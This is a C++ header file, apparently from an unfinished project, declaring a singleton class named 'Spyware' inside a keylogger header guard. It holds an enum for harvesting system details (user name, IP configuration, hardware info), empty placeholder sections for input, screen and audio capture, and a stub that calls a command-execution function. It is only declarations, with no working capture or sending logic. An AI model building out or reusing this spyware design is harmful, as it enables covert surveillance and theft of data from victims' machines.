#ifndef KEYLOGGER_H
#define KEYLOGGER_H

#ifdef _WIN32
    #include <windows.h>
#elif __linux__
    #error "OS not supperted."
#else
  #error "OS not supperted."
#endif

#include "auxiliary.h"
#include "keylogger.h"
#include <fstream>
#include <iostream>

class Spyware : public AuxiliaryData {
    private:
        static Spyware *instance;
        Spyware();

        // INPUT CAPTURE

        enum commands { USER_NAME, OS_VERSION, IP_CONFIG, CPU_INFO, MEMORY_INFO, STORAGE_INFO };

        
        std::string getSystemData(int id);


        // SCREEN CAPTURE

        // AUDIO CAPTURE

    public:
        static Spyware *getInstance();

        // INPUT CAPTURE

        void timee() {
          commandExecution("hhh");
        }
};

#endif
